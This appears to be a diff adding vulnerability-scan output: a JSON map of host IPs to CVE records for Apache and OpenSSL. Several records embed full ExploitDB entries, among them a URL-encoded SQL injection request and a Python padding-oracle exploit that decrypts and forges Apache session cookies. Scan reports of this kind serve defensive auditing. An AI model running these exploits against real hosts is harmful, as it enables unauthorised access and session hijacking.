@@ -1,0 +1,616 @@
+{
+    "152.46.3.13": {
+        "CVE-2019-1559": [
+            {
+                "source": "CVE",
+                "_id": "2019-1559",
+                "description": "If an application encounters a fatal protocol error and then calls SSL_shutdown() twice (once to send a close_notify, and once to receive one) then OpenSSL can respond differently to the calling application if a 0 byte record is received with invalid padding compared to if a 0 byte record is received with an invalid MAC. If the application then behaves differently based on that in a way that is detectable to the remote peer, then this amounts to a padding oracle that could be used to decrypt data. In order for this to be exploitable \"non-stitched\" ciphersuites must be in use. Stitched ciphersuites are optimised implementations of certain commonly used ciphersuites. Also the application must call SSL_shutdown() twice even if a protocol error has occurred (applications should not do this but some do anyway). Fixed in OpenSSL 1.0.2r (Affected 1.0.2-1.0.2q).",
+                "osvdb": [],
+                "bid": [
+                    107174
+                ],
+                "cve": [
+                    "CVE-2019-1559"
+                ],
+                "msb": []
+            },
+            {
+                "code": "# Exploit Title: Kepler Wallpaper Script 1.1 - SQL Injection\r\n# Dork: N/A\r\n# Date: 2019-01-19\r\n# Exploit Author: Ihsan Sencan\r\n# Vendor Homepage: https://keplerwallpapers.online/\r\n# Software Link: https://codeclerks.com/PHP/1559/Kepler-Wallpaper-Script\r\n# Version: 1.1\r\n# Category: Webapps\r\n# Tested on: WiN7_x64/KaLiLinuX_x64\r\n# CVE: N/A\r\n\r\n# POC: \r\n# 1)\r\n# http://localhost/[PATH]//[PATH]/category/xxx[SQL]\r\n# \r\n\r\nGET /[PATH]/category/xxx%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2c%32%32%2d%2d%20%2d HTTP/1.1\r\nHost: TARGET\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate, br\r\nCookie: PHPSESSID=6963a7f072dbf72fb4cb420c9f5ad80a; ResolutionWidthAuto=1366; ResolutionHeightAuto=768; FilterType=Auto\r\nDNT: 1\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nHTTP/1.1 200 OK\r\nDate: Sat, 19 Jan 2019 09:01:06 GMT\r\nServer: Apache\r\nX-Powered-By: PHP/5.6.37\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nPragma: no-cache\r\nAccess-Control-Allow-Origin: *\r\nStrict-Transport-Security: max-age=31536000\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html; charset=UTF-8",
+                "description": "Kepler Wallpaper Script 1.1 - SQL Injection",
+                "author": "Ihsan Sencan",
+                "_id": 46207,
+                "source": "ExploitDB",
+                "platform": "php",
+                "date": "2019-01-21T00:00:00+00:00",
+                "cve": [],
+                "type": "webapps",
+                "port": 80
+            }
+        ],
+        "CVE-2014-0117": [
+            {
+                "source": "CVE",
+                "_id": "2014-0117",
+                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
+                "osvdb": [],
+                "bid": [],
+                "cve": [
+                    "CVE-2014-0117"
+                ],
+                "msb": []
+            }
+        ],
+        "CVE-2014-0118": [
+            {
+                "source": "CVE",
+                "_id": "2014-0118",
+                "description": "The deflate_in_filter function in mod_deflate.c in the mod_deflate module in the Apache HTTP Server before 2.4.10, when request body decompression is enabled, allows remote attackers to cause a denial of service (resource consumption) via crafted request data that decompresses to a much larger size.",
+                "osvdb": [],
+                "bid": [
+                    68745
+                ],
+                "cve": [
+                    "CVE-2014-0118"
+                ],
+                "msb": []
+            }
+        ],
+        "CVE-2021-23840": [],
+        "CVE-2016-0736": [
+            {
+                "source": "CVE",
+                "_id": "2016-0736",
+                "description": "In Apache HTTP Server versions 2.4.0 to 2.4.23, mod_session_crypto was encrypting its data/cookie using the configured ciphers with possibly either CBC or ECB modes of operation (AES256-CBC by default), hence no selectable or builtin authenticated encryption. This made it vulnerable to padding oracle attacks, particularly with CBC.",
+                "osvdb": [],
+                "bid": [
+                    95078
+                ],
+                "cve": [
+                    "CVE-2016-0736"
+                ],
+                "msb": []
+            },
+            {
+                "code": "'''\r\nAdvisory: Padding Oracle in Apache mod_session_crypto\r\n\r\nDuring a penetration test, RedTeam Pentesting discovered a Padding\r\nOracle vulnerability in mod_session_crypto of the Apache web server.\r\nThis vulnerability can be exploited to decrypt the session data and even\r\nencrypt attacker-specified data.\r\n\r\n\r\nDetails\r\n=======\r\n\r\nProduct: Apache HTTP Server mod_session_crypto\r\nAffected Versions: 2.3 to 2.5\r\nFixed Versions: 2.4.25\r\nVulnerability Type: Padding Oracle\r\nSecurity Risk: high\r\nVendor URL: https://httpd.apache.org/docs/trunk/mod/mod_session_crypto.html\r\nVendor Status: fixed version released\r\nAdvisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2016-001.txt\r\nAdvisory Status: published\r\nCVE: CVE-2016-0736\r\nCVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0736\r\n\r\n\r\nIntroduction\r\n============\r\n\r\nThe module mod_session_crypto of the Apache HTTP Server can be used in\r\nconjunction with the modules mod_session and mod_session_cookie to store\r\nsession data in an encrypted cookie within the users' browsers. This\r\navoids server-side session state so that incoming HTTP requests can be\r\neasily distributed amongst a number of application web servers which do\r\nnot need to share session state.\r\n\r\n\r\nMore Details\r\n============\r\n\r\nThe module mod_session_crypto uses symmetric cryptography to encrypt and\r\ndecrypt session data and uses mod_session to store the encrypted data in\r\na cookie (usually called \"session\") within the user's browser. The\r\ndecrypted session is then made available to the application in an\r\nenvironment variable (in case of a CGI script) or in a custom HTTP\r\nrequest header. The application can add a custom HTTP response header\r\n(usually \"X-Replace-Session\") which instructs the HTTP server to replace\r\nthe session's content with the value of the header. Detailed\r\ninstructions to set up mod_session and mod_session_crypto can be found\r\nin the documentation:\r\nhttps://httpd.apache.org/docs/2.4/mod/mod_session.html#basicexamples\r\n\r\nThe module mod_session_crypto is configured to use either 3DES or AES\r\nwith various key sizes, defaulting to AES256. Encryption is handled by\r\nthe function \"encrypt_string\":\r\n\r\nmodules/session/mod_session_crypto.c\r\n------------------------------------------------------------------------\r\n/**\r\n * Encrypt the string given as per the current config.\r\n *\r\n * Returns APR_SUCCESS if successful.\r\n */\r\nstatic apr_status_t encrypt_string(request_rec * r, const apr_crypto_t *f,\r\n        session_crypto_dir_conf *dconf, const char *in, char **out)\r\n{\r\n[...]\r\n    apr_crypto_key_t *key = NULL;\r\n[...]\r\n    const unsigned char *iv = NULL;\r\n[...]\r\n\r\n    /* use a uuid as a salt value, and prepend it to our result */\r\n    apr_uuid_get(&salt);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_passphrase(&key, &ivSize, passphrase,\r\n            strlen(passphrase),\r\n            (unsigned char *) (&salt), sizeof(apr_uuid_t),\r\n            *cipher, APR_MODE_CBC, 1, 4096, f, r->pool);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_block_encrypt_init(&block, &iv, key, &blockSize, r->pool);\r\n[...]\r\n    res = apr_crypto_block_encrypt(&encrypt, &encryptlen, (unsigned char *)in,\r\n            strlen(in), block);\r\n[...]\r\n    res = apr_crypto_block_encrypt_finish(encrypt + encryptlen, &tlen, block);\r\n[...]\r\n\r\n    /* prepend the salt and the iv to the result */\r\n    combined = apr_palloc(r->pool, ivSize + encryptlen + sizeof(apr_uuid_t));\r\n    memcpy(combined, &salt, sizeof(apr_uuid_t));\r\n    memcpy(combined + sizeof(apr_uuid_t), iv, ivSize);\r\n    memcpy(combined + sizeof(apr_uuid_t) + ivSize, encrypt, encryptlen);\r\n\r\n    /* base64 encode the result */\r\n    base64 = apr_palloc(r->pool, apr_base64_encode_len(ivSize + encryptlen +\r\n                    sizeof(apr_uuid_t) + 1)\r\n            * sizeof(char));\r\n[...]\r\n    return res;\r\n}\r\n------------------------------------------------------------------------\r\n\r\nThe source code shows that an encryption key is derived from the\r\nconfigured password and a randomly chosen salt by calling the function\r\n\"apr_crypto_passphrase\". This function internally uses PBKDF2 to derive\r\nthe key. The data is then encrypted and the salt and IV prepended to the\r\nencrypted data. Before returning to the caller, the result is encoded as\r\nbase64.\r\n\r\nThis procedure does not guarantee integrity of the ciphertext, so the\r\nApache module is unable to detect whether a session sent back to the\r\nserver has been tampered with. Depending on the application this often\r\nmeans that attackers are able to exploit a Padding Oracle vulnerability.\r\nThis allows decrypting the session and encrypting arbitrary data chosen\r\nby the attacker.\r\n\r\n\r\nProof of Concept\r\n================\r\n\r\nThe vulnerability can be reproduced as follows. First, the modules\r\nmod_session, mod_session_crypto and mod_session_cookie are enabled and\r\nconfigured:\r\n\r\n------------------------------------------------------------------------\r\nSession On\r\nSessionEnv On\r\nSessionCookieName session path=/\r\nSessionHeader X-Replace-Session\r\nSessionCryptoPassphrase RedTeam\r\n------------------------------------------------------------------------\r\n\r\nIn addition, CGI scripts are enabled for a folder and the following CGI\r\nscript is saved as \"status.rb\" and is made available to clients:\r\n\r\n------------------------------------------------------------------------\r\n#!/usr/bin/env ruby\r\n\r\nrequire 'cgi'\r\n\r\ncgi = CGI.new\r\ndata = CGI.parse(ENV['HTTP_SESSION'])\r\n\r\nif data.has_key? 'username'\r\n        puts\r\n        puts \"your username is %s\" % data['username']\r\n        exit\r\nend\r\n\r\nputs \"X-Replace-Session: username=guest&timestamp=\" + Time.now.strftime(\"%s\")\r\nputs\r\nputs \"not logged in\"\r\n------------------------------------------------------------------------\r\n\r\nOnce the CGI script is correctly set up, the command-line HTTP client curl\r\ncan be used to access it:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -i http://127.0.0.1:8080/cgi-bin/status.rb\r\nHTTP/1.1 200 OK\r\nDate: Tue, 19 Jan 2016 13:23:19 GMT\r\nServer: Apache/2.4.10 (Ubuntu)\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nCache-Control: no-cache\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-ruby\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThe example shows that a new encrypted cookie with the name \"session\" is\r\nreturned, and the response body contains the text \"not logged in\".\r\nCalling the script again with the cookie just returned reveals that the\r\nusername in the session is set to \"guest\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is guest\r\n------------------------------------------------------------------------\r\n\r\nSending a modified cookie ending in \"u=\" instead of \"U=\" will invalidate\r\nthe padding at the end of the ciphertext, so the session cannot be\r\ndecrypted correctly and is therefore not passed to the CGI script, which\r\nreturns the text \"not logged in\" again:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRu= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThis verifies the existence of the Padding Oracle vulnerability. The\r\nPython library[1] python-paddingoracle was then used to implement\r\ndecrypting the session by exploiting the Padding Oracle vulnerability.\r\n\r\nexploit.py\r\n------------------------------------------------------------------------\r\n'''\r\n\r\nfrom paddingoracle import BadPaddingException, PaddingOracle\r\nfrom base64 import b64encode, b64decode\r\nimport requests\r\n\r\nclass PadBuster(PaddingOracle):\r\n    def __init__(self, valid_cookie, **kwargs):\r\n        super(PadBuster, self).__init__(**kwargs)\r\n        self.wait = kwargs.get('wait', 2.0)\r\n        self.valid_cookie = valid_cookie\r\n\r\n    def oracle(self, data, **kwargs):\r\n        v = b64encode(self.valid_cookie+data)\r\n\r\n        response = requests.get('http://127.0.0.1:8080/cgi-bin/status.rb',\r\n                cookies=dict(session=v), stream=False, timeout=5, verify=False)\r\n\r\n        if 'username' in response.content:\r\n            logging.debug('No padding exception raised on %r', v)\r\n            return\r\n\r\n        raise BadPaddingException\r\n\r\nif __name__ == '__main__':\r\n    import logging\r\n    import sys\r\n\r\n    if not sys.argv[2:]:\r\n        print 'Usage: [encrypt|decrypt] <session value> <plaintext>'\r\n        sys.exit(1)\r\n\r\n    logging.basicConfig(level=logging.WARN)\r\n    mode = sys.argv[1]\r\n    session = b64decode(sys.argv[2])\r\n    padbuster = PadBuster(session)\r\n\r\n    if mode == \"decrypt\":\r\n        cookie = padbuster.decrypt(session[32:], block_size=16, iv=session[16:32])\r\n        print('Decrypted session:\\n%r' % cookie)\r\n    elif mode == \"encrypt\":\r\n        key = session[0:16]\r\n        plaintext = sys.argv[3]\r\n\r\n        s = padbuster.encrypt(plaintext, block_size=16)\r\n\r\n        data = b64encode(key+s[0:len(s)-16])\r\n        print('Encrypted session:\\n%s' % data)\r\n    else:\r\n        print \"invalid mode\"\r\n        sys.exit(1)\r\n\r\n'''\r\n------------------------------------------------------------------------\r\n\r\nThis Python script can then be used to decrypt the session:\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py decrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=\r\nDecrypted session:\r\nb'username=guest&timestamp=1453282205\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r'\r\n\r\nreal    6m43.088s\r\nuser    0m15.464s\r\nsys 0m0.976s\r\n------------------------------------------------------------------------\r\n\r\nIn this sample application, the username and a timestamp are included in\r\nthe session data. The Python script can also be used to encrypt a new\r\nsession containing the username \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py encrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYB\\\r\nRU= username=admin\r\n\r\nEncrypted session:\r\nsxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7zmQ/GLFjF4pcXY\r\n\r\nreal3m38.002s\r\nusers0m8.536s\r\nsys0m0.512s\r\n\r\n------------------------------------------------------------------------\r\n\r\nSending this newly encrypted session to the server shows that the\r\nusername is now \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7\\\r\nzmQ/GLFjF4pcXY http://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is admin\r\n------------------------------------------------------------------------\r\n\r\n\r\nWorkaround\r\n==========\r\n\r\nUse a different means to store the session, e.g. in a database by using\r\nmod_session_dbd.\r\n\r\n\r\nFix\r\n===\r\n\r\nUpdate to Apache HTTP version 2.4.25 (see [2]).\r\n\r\n\r\nSecurity Risk\r\n=============\r\n\r\nApplications which use mod_session_crypto usually store sensitive values\r\nin the session and rely on an attacker's inability to decrypt or modify\r\nthe session. Successful exploitation of the Padding Oracle vulnerability\r\nsubverts this mechanism and allows to construct sessions with arbitrary\r\nattacker-specified content. Depending on the application this may\r\ncompletely subvert the application's security. Therefore, this\r\nvulnerability poses a high risk.\r\n\r\n\r\nTimeline\r\n========\r\n\r\n2016-01-11 Vulnerability identified\r\n2016-01-12 Customer approved disclosure to vendor\r\n2016-01-12 CVE number requested\r\n2016-01-20 Vendor notified\r\n2016-01-22 Vendor confirmed the vulnerability\r\n2016-02-03 Vendor provided patch\r\n2016-02-04 Apache Security Team assigned CVE number\r\n2016-03-03 Requested status update from vendor, no response\r\n2016-05-02 Requested status update from vendor, no response\r\n2016-07-14 Requested status update and roadmap from vendor\r\n2016-07-21 Vendor confirms working on a new released and inquired whether the\r\n           patch fixes the vulnerability\r\n2016-07-22 RedTeam confirms\r\n2016-08-24 Requested status update from vendor\r\n2016-08-29 Vendor states that there is no concrete timeline\r\n2016-12-05 Vendor announces a release\r\n2016-12-20 Vendor released fixed version\r\n2016-12-23 Advisory released\r\n\r\n\r\nReferences\r\n==========\r\n\r\n[1] https://github.com/mwielgoszewski/python-paddingoracle\r\n[2] http://httpd.apache.org/security/vulnerabilities_24.html\r\n\r\n\r\nRedTeam Pentesting GmbH\r\n=======================\r\n\r\nRedTeam Pentesting offers individual penetration tests performed by a\r\nteam of specialised IT-security experts. Hereby, security weaknesses in\r\ncompany networks or products are uncovered and can be fixed immediately.\r\n\r\nAs there are only few experts in this field, RedTeam Pentesting wants to\r\nshare its knowledge and enhance the public knowledge with research in\r\nsecurity-related areas. The results are made available as public\r\nsecurity advisories.\r\n\r\nMore information about RedTeam Pentesting can be found at:\r\nhttps://www.redteam-pentesting.de/\r\n'''",
+                "description": "Apache mod_session_crypto - Padding Oracle",
+                "author": "RedTeam Pentesting GmbH",
+                "_id": 40961,
+                "source": "ExploitDB",
+                "platform": "multiple",
+                "date": "2016-12-23T00:00:00+00:00",
+                "cve": [
+                    "CVE-2016-0736"
+                ],
+                "type": "webapps",
+                "port": 0
+            }
+        ],
+        "CVE-2015-3185": [
+            {
+                "source": "CVE",
+                "_id": "2015-3185",
+                "description": "The ap_some_auth_required function in server/request.c in the Apache HTTP Server 2.4.x before 2.4.14 does not consider that a Require directive may be associated with an authorization setting rather than an authentication setting, which allows remote attackers to bypass intended access restrictions in opportunistic circumstances by leveraging the presence of a module that relies on the 2.2 API behavior.",
+                "osvdb": [],
+                "bid": [
+                    75965
+                ],
+                "cve": [
+                    "CVE-2015-3185"
+                ],
+                "msb": []
+            }
+        ],
+        "CVE-2015-3184": [
+            {
+                "source": "CVE",
+                "_id": "2015-3184",
+                "description": "mod_authz_svn in Apache Subversion 1.7.x before 1.7.21 and 1.8.x before 1.8.14, when using Apache httpd 2.4.x, does not properly restrict anonymous access, which allows remote anonymous users to read hidden files via the path name.",
+                "osvdb": [],
+                "bid": [
+                    76274
+                ],
+                "cve": [
+                    "CVE-2015-3184"
+                ],
+                "msb": []
+            }
+        ],
+        "CVE-2018-1312": [
+            {
+                "source": "CVE",
+                "_id": "2018-1312",
+                "description": "In Apache httpd 2.2.0 to 2.4.29, when generating an HTTP Digest authentication challenge, the nonce sent to prevent reply attacks was not correctly generated using a pseudo-random seed. In a cluster of servers using a common Digest authentication configuration, HTTP requests could be replayed across servers by an attacker without detection.",
+                "osvdb": [],
+                "bid": [
+                    103524
+                ],
+                "cve": [
+                    "CVE-2018-1312"
+                ],
+                "msb": []
+            }
+        ]
+    },
+    "152.46.3.32": {
+        "CVE-2019-1559": [
+            {
+                "source": "CVE",
+                "_id": "2019-1559",
+                "description": "If an application encounters a fatal protocol error and then calls SSL_shutdown() twice (once to send a close_notify, and once to receive one) then OpenSSL can respond differently to the calling application if a 0 byte record is received with invalid padding compared to if a 0 byte record is received with an invalid MAC. If the application then behaves differently based on that in a way that is detectable to the remote peer, then this amounts to a padding oracle that could be used to decrypt data. In order for this to be exploitable \"non-stitched\" ciphersuites must be in use. Stitched ciphersuites are optimised implementations of certain commonly used ciphersuites. Also the application must call SSL_shutdown() twice even if a protocol error has occurred (applications should not do this but some do anyway). Fixed in OpenSSL 1.0.2r (Affected 1.0.2-1.0.2q).",
+                "osvdb": [],
+                "bid": [
+                    107174
+                ],
+                "cve": [
+                    "CVE-2019-1559"
+                ],
+                "msb": []
+            },
+            {
+                "code": "# Exploit Title: Kepler Wallpaper Script 1.1 - SQL Injection\r\n# Dork: N/A\r\n# Date: 2019-01-19\r\n# Exploit Author: Ihsan Sencan\r\n# Vendor Homepage: https://keplerwallpapers.online/\r\n# Software Link: https://codeclerks.com/PHP/1559/Kepler-Wallpaper-Script\r\n# Version: 1.1\r\n# Category: Webapps\r\n# Tested on: WiN7_x64/KaLiLinuX_x64\r\n# CVE: N/A\r\n\r\n# POC: \r\n# 1)\r\n# http://localhost/[PATH]//[PATH]/category/xxx[SQL]\r\n# \r\n\r\nGET /[PATH]/category/xxx%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2c%32%32%2d%2d%20%2d HTTP/1.1\r\nHost: TARGET\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate, br\r\nCookie: PHPSESSID=6963a7f072dbf72fb4cb420c9f5ad80a; ResolutionWidthAuto=1366; ResolutionHeightAuto=768; FilterType=Auto\r\nDNT: 1\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nHTTP/1.1 200 OK\r\nDate: Sat, 19 Jan 2019 09:01:06 GMT\r\nServer: Apache\r\nX-Powered-By: PHP/5.6.37\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nPragma: no-cache\r\nAccess-Control-Allow-Origin: *\r\nStrict-Transport-Security: max-age=31536000\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html; charset=UTF-8",
+                "description": "Kepler Wallpaper Script 1.1 - SQL Injection",
+                "author": "Ihsan Sencan",
+                "_id": 46207,
+                "source": "ExploitDB",
+                "platform": "php",
+                "date": "2019-01-21T00:00:00+00:00",
+                "cve": [],
+                "type": "webapps",
+                "port": 80
+            }
+        ],
+        "CVE-2014-0117": [
+            {
+                "source": "CVE",
+                "_id": "2014-0117",
+                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
+                "osvdb": [],
+                "bid": [],
+                "cve": [
+                    "CVE-2014-0117"
+                ],
+                "msb": []
+            }
+        ],
+        "CVE-2014-0118": [
+            {
+                "source": "CVE",
+                "_id": "2014-0118",
+                "description": "The deflate_in_filter function in mod_deflate.c in the mod_deflate module in the Apache HTTP Server before 2.4.10, when request body decompression is enabled, allows remote attackers to cause a denial of service (resource consumption) via crafted request data that decompresses to a much larger size.",
+                "osvdb": [],
+                "bid": [
+                    68745
+                ],
+                "cve": [
+                    "CVE-2014-0118"
+                ],
+                "msb": []
+            }
+        ]
+    },
+    "152.46.3.36": {},
+    "152.46.3.47": {
+        "CVE-2010-2068": [
+            {
+                "source": "CVE",
+                "_id": "2010-2791",
+                "description": "mod_proxy in httpd in Apache HTTP Server 2.2.9, when running on Unix, does not close the backend connection if a timeout occurs when reading a response from a persistent connection, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.  NOTE: this is the same issue as CVE-2010-2068, but for a different OS and set of affected versions.",
+                "osvdb": [],
+                "bid": [
+                    42102
+                ],
+                "cve": [
+                    "CVE-2010-2791"
+                ],
+                "msb": []
+            },
+            {
+                "source": "CVE",
+                "_id": "2010-2068",
+                "description": "mod_proxy_http.c in mod_proxy_http in the Apache HTTP Server 2.2.9 through 2.2.15, 2.3.4-alpha, and 2.3.5-alpha on Windows, NetWare, and OS/2, in certain configurations involving proxy worker pools, does not properly detect timeouts, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.",
+                "osvdb": [],
+                "bid": [
+                    40827
+                ],
+                "cve": [
+                    "CVE-2010-2068"
+                ],
+                "msb": []
+            }
+        ]
+    },
+    "152.46.3.52": {
+        "CVE-2010-2068": [
+            {
+                "source": "CVE",
+                "_id": "2010-2791",
+                "description": "mod_proxy in httpd in Apache HTTP Server 2.2.9, when running on Unix, does not close the backend connection if a timeout occurs when reading a response from a persistent connection, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.  NOTE: this is the same issue as CVE-2010-2068, but for a different OS and set of affected versions.",
+                "osvdb": [],
+                "bid": [
+                    42102
+                ],
+                "cve": [
+                    "CVE-2010-2791"
+                ],
+                "msb": []
+            },
+            {
+                "source": "CVE",
+                "_id": "2010-2068",
+                "description": "mod_proxy_http.c in mod_proxy_http in the Apache HTTP Server 2.2.9 through 2.2.15, 2.3.4-alpha, and 2.3.5-alpha on Windows, NetWare, and OS/2, in certain configurations involving proxy worker pools, does not properly detect timeouts, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.",
+                "osvdb": [],
+                "bid": [
+                    40827
+                ],
+                "cve": [
+                    "CVE-2010-2068"
+                ],
+                "msb": []
+            }
+        ]
+    },
+    "152.46.3.59": {},
+    "152.46.3.61": {},
+    "152.46.3.64": {
+        "CVE-2010-2068": [
+            {
+                "source": "CVE",
+                "_id": "2010-2791",
+                "description": "mod_proxy in httpd in Apache HTTP Server 2.2.9, when running on Unix, does not close the backend connection if a timeout occurs when reading a response from a persistent connection, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.  NOTE: this is the same issue as CVE-2010-2068, but for a different OS and set of affected versions.",
+                "osvdb": [],
+                "bid": [
+                    42102
+                ],
+                "cve": [
+                    "CVE-2010-2791"
+                ],
+                "msb": []
+            },
+            {
+                "source": "CVE",
+                "_id": "2010-2068",
+                "description": "mod_proxy_http.c in mod_proxy_http in the Apache HTTP Server 2.2.9 through 2.2.15, 2.3.4-alpha, and 2.3.5-alpha on Windows, NetWare, and OS/2, in certain configurations involving proxy worker pools, does not properly detect timeouts, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.",
+                "osvdb": [],
+                "bid": [
+                    40827
+                ],
+                "cve": [
+                    "CVE-2010-2068"
+                ],
+                "msb": []
+            }
+        ]
+    },
+    "152.46.3.68": {},
+    "152.46.3.70": {},
+    "152.46.3.84": {
+        "CVE-2010-2068": [
+            {
+                "source": "CVE",
+                "_id": "2010-2791",
+                "description": "mod_proxy in httpd in Apache HTTP Server 2.2.9, when running on Unix, does not close the backend connection if a timeout occurs when reading a response from a persistent connection, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.  NOTE: this is the same issue as CVE-2010-2068, but for a different OS and set of affected versions.",
+                "osvdb": [],
+                "bid": [
+                    42102
+                ],
+                "cve": [
+                    "CVE-2010-2791"
+                ],
+                "msb": []
+            },
+            {
+                "source": "CVE",
+                "_id": "2010-2068",
+                "description": "mod_proxy_http.c in mod_proxy_http in the Apache HTTP Server 2.2.9 through 2.2.15, 2.3.4-alpha, and 2.3.5-alpha on Windows, NetWare, and OS/2, in certain configurations involving proxy worker pools, does not properly detect timeouts, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.",
+                "osvdb": [],
+                "bid": [
+                    40827
+                ],
+                "cve": [
+                    "CVE-2010-2068"
+                ],
+                "msb": []
+            }
+        ]
+    },
+    "152.46.3.88": {},
+    "152.46.3.89": {},
+    "152.46.3.103": {
+        "CVE-2019-1559": [
+            {
+                "source": "CVE",
+                "_id": "2019-1559",
+                "description": "If an application encounters a fatal protocol error and then calls SSL_shutdown() twice (once to send a close_notify, and once to receive one) then OpenSSL can respond differently to the calling application if a 0 byte record is received with invalid padding compared to if a 0 byte record is received with an invalid MAC. If the application then behaves differently based on that in a way that is detectable to the remote peer, then this amounts to a padding oracle that could be used to decrypt data. In order for this to be exploitable \"non-stitched\" ciphersuites must be in use. Stitched ciphersuites are optimised implementations of certain commonly used ciphersuites. Also the application must call SSL_shutdown() twice even if a protocol error has occurred (applications should not do this but some do anyway). Fixed in OpenSSL 1.0.2r (Affected 1.0.2-1.0.2q).",
+                "osvdb": [],
+                "bid": [
+                    107174
+                ],
+                "cve": [
+                    "CVE-2019-1559"
+                ],
+                "msb": []
+            },
+            {
